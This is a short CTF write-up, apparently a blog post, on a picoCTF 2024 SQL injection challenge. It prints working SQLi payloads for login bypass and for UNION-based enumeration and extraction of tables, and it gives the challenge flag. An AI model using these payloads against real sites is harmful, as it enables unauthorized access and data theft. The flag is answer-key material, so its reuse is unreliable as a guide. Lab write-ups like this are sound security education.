---
title: "picoCTF 2024 — SQL Injection Login Bypass"
date: "2025-05-20"
tags: ["CTF", "Web", "SQLi", "picoCTF"]
difficulty: "Medium"
summary: "Walked through a classic SQL injection challenge — bypassing login auth and extracting the flag from a backend database using UNION-based injection."
---

## Challenge Overview

The challenge presented a simple login form with no visible hints. The goal was to retrieve a hidden flag stored in the database.

## Reconnaissance

Opening the page source revealed a standard HTML form posting to `/login` with `username` and `password` fields. No client-side validation was present.

## Exploitation

Tried a basic auth bypass payload in the username field:

```
' OR '1'='1
```

The server returned a 200 with a welcome message — confirming SQL injection was possible. From there, used UNION-based injection to enumerate tables:

```sql
' UNION SELECT table_name, null FROM information_schema.tables--
```

Found a `flags` table. Extracted with:

```sql
' UNION SELECT flag, null FROM flags--
```

## Flag

```
picoCTF{sql_1nj3ct10n_1s_cl4ss1c}
```

## Takeaways

- Always test login forms for basic SQLi before moving to complex payloads
- UNION-based injection is reliable when output is reflected in the response
- Parameterized queries would have completely prevented this
